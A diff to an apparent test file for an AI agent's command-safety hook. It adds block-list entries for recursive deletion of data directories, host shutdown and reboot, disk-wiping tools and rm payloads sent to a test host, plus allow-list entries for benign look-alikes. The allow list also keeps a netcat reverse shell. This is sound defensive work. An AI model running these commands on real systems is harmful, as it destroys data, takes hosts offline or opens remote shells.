@@ -17,6 +17,14 @@ BLOCKED_COMMANDS = [
     "rm -rf ~",
     "rm -rf /etc",
     "rm -rf '/'",
+    # DATA directories the one-level catastrophic rule misses (F5 gap):
+    "rm -rf /var/lib/mysql",
+    "rm -rf /data",
+    "rm -rf /var/www/html",
+    "rm -rf /home/alice/Documents",
+    "rm -rf /backups",
+    "sudo rm -rf /var/lib/postgresql",
+    "rm --recursive --force /home/bob/x",
     # destructive rm SHIPPED TO A TARGET (rm co-located with a URL) — blocked at
     # any path, because destroying target data/files is never a proof step:
     "curl 'http://t.test/?c=rm -rf /app/data'",
@@ -26,6 +34,24 @@ BLOCKED_COMMANDS = [
     # harm-as-purpose / secure-wipe destruction (never auto):
     "vssadmin delete shadows /all /quiet",
     "wbadmin delete catalog -quiet",
+    # OS host shutdown/reboot commands (narrowed rule still catches these):
+    "shutdown -h now",
+    "shutdown /s /t 0",
+    "reboot",
+    "shutdown.exe /r",
+    "systemctl poweroff",
+    "systemctl reboot",
+    "systemctl halt",
+    "/sbin/shutdown -h now",
+    "/sbin/reboot",
+    "sudo systemctl poweroff",
+    "init 0",
+    "telinit 6",
+    # Windows native host power control (PowerShell cmdlets), incl. ;/&& separators:
+    "Stop-Computer",
+    "Restart-Computer -Force",
+    "1; Stop-Computer",
+    "true && Restart-Computer",
     "shred -u -z secret.key",
     "wipefs -a /dev/sda",
     "dd if=/dev/zero of=/dev/sda bs=1M",
@@ -35,6 +61,12 @@ BLOCKED_COMMANDS = [
     "mongosh --eval 'db.users.drop()'",
     "curl 'https://t.test/?q=1;DROP TABLE users--'",
     "curl -X DELETE https://example.test/api/item/1",
+    # scrub disk-wipe tool invoked on a device / with flags (narrowed from bare \\bscrub\\b):
+    "scrub -p dod /dev/sda",
+    "scrub --remove /data/dir",
+    # destructive rm injected as a QUOTED payload to a target (both quote styles, long flag):
+    "curl \"http://t.test/?c=rm -rf /opt/app\"",
+    "curl 'http://t.test/?c=rm --recursive /app'",
     "masscan 10.0.0.0/8",
     "terraform destroy -auto-approve",
     "kubectl delete pod web-0",
@@ -54,6 +86,40 @@ ALLOWED_COMMANDS = [
     "rm -rf tmp/build",
     "rm -f runs/dvwa_20260613/evidence/cookies.txt",
     "rm -rf node_modules",
+    # data-dir rule must NOT over-block relative / ephemeral paths, nor look-alike
+    # TLD-boundary names; deep /opt|/srv|/mnt data is a conscious residual (falls to
+    # the native ask flow, not silent-allow — see review/records 2026-06-15 D2):
+    "rm -rf /tmp/cache",
+    "rm -rf var/lib/local",
+    "rm -rf ./var/www/build",
+    "rm -rf /databases",
+    "rm -rf /backupsxyz",
+    "rm -rf /opt/app/data",
+    # STANDALONE local scratch rm sharing a line with a probe URL must NOT be denied
+    # (the rm -rf-shipped-to-target rule only fires when rm -rf is INSIDE a quoted payload):
+    "rm -f runs/<run>/_tmp.json; python tools/probe.py GET https://t.test/",
+    "grep -rniE 'token' poc/ ; rm -f scratch.txt",
+    "rm -rf tmp/build && curl http://t.test/",
+    "curl http://t.test/?c=rm+-rf+/app/data",
+    # 'scrub' as a word / read-only zpool scrub must NOT be denied (narrowed scrub rule):
+    "zpool scrub tank",
+    "echo 'SCRUB verify: grep poc/'",
+    # benign Python/IO method calls named shutdown/reboot must NOT be denied
+    # (narrowed shutdown rule excludes dotted method calls + name() calls):
+    "python -c 'srv.shutdown()'",
+    "python -c 'self.executor.shutdown(wait=False)'",
+    "python -c 'import logging; logging.shutdown()'",
+    "python -c 'sock.shutdown(socket.SHUT_RDWR)'",
+    # the word shutdown/reboot as DATA (grep/echo argument, URL param) must NOT be denied:
+    "grep -n 'shutdown|reboot' .claude/hooks/safety_rules.json",
+    "echo shutdown rule narrowed",
+    "curl 'https://t.test/?x=1&shutdown=now'",
+    "echo systemctl is a service manager",
+    "echo 'Restart-Computer reboots a Windows host'",
+    "grep Restart-Computer .claude/hooks/safety_rules.json",
+    "Get-Help Restart-Computer",
+    "git init",
+    "npm init -y",
     "Get-ChildItem -Force",
     "python tools/check_rules.py",
     "nc -e /bin/sh 10.0.0.1 4444",
